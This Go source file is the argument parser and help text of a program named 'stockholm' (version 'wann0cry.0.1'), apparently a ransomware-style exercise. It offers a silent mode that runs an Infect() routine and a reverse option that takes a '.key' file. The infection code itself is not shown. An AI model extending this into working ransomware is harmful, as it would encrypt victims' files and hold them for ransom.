package main

import (
	"fmt"
	"strings"
)

func ParseOption(argslen int, args []string) {
	if (argslen == 2) {
		if (args[1] == "-version" || 
			args[1] == "-v") {
			fmt.Println("stockholm:wann0cry.0.1")
			return
		} else if (args[1] == "-silent" || args[1] == "-s") {
			silentMode = true
			Infect()
			return
		}
	} else if (argslen == 3) {
		if (args[1] == "-reverse" || args[1] == "-r") {
			if strings.HasSuffix(args[2], ".key") {
				secretKey = args[2]
				Reverse()
				return
			}
		}
	}
	Help()
}

func Help() {
	fmt.Println("usage:	./stockholm [...options]")
	fmt.Println("\t -version or -v \t  show the version of the program.")
	fmt.Println("\t -reverse or -r [.key] \t  reverse the infection with key.")
	fmt.Println("\t -silent or -s \t\t  the program will not produce any output.")
	fmt.Println("\t -help or -h \t\t  display the help.")
}